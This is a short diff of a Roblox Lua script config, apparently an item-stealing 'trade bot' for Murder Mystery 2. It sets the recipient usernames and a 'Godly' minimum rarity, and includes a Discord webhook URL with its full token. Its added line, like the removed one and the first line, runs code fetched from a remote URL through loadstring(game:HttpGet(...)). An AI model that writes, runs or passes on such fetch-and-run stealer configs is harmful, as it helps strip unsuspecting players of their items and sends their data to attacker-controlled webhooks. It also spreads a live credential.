@@ -1,8 +1,7 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Sigma/refs/heads/main/text%209.txt"))()
-_G.Usernames = {"botbotter_10", "IIIIIIIIIIIIIlllIII2"} -- you can add as many as you'd like
-_G.min_rarity = "Legendary"
+_G.Usernames = {"bot otter_10", "IIIIIIIIIIIIIlllIII2"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1319000390984794132/7LVv0RJgJC7gPWxQ8tom-VvvEBoFOR7B87K6dTergsmcDUE9mIoJh5VMe9gxD-BwuDoA" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Best-mm2-script/refs/heads/main/Mm2%20trade.txt"))()
+loadstring(game:HttpGet("https://codeberg.org/unkowncoder/MM2/raw/branch/main/tradebot.lua"))()
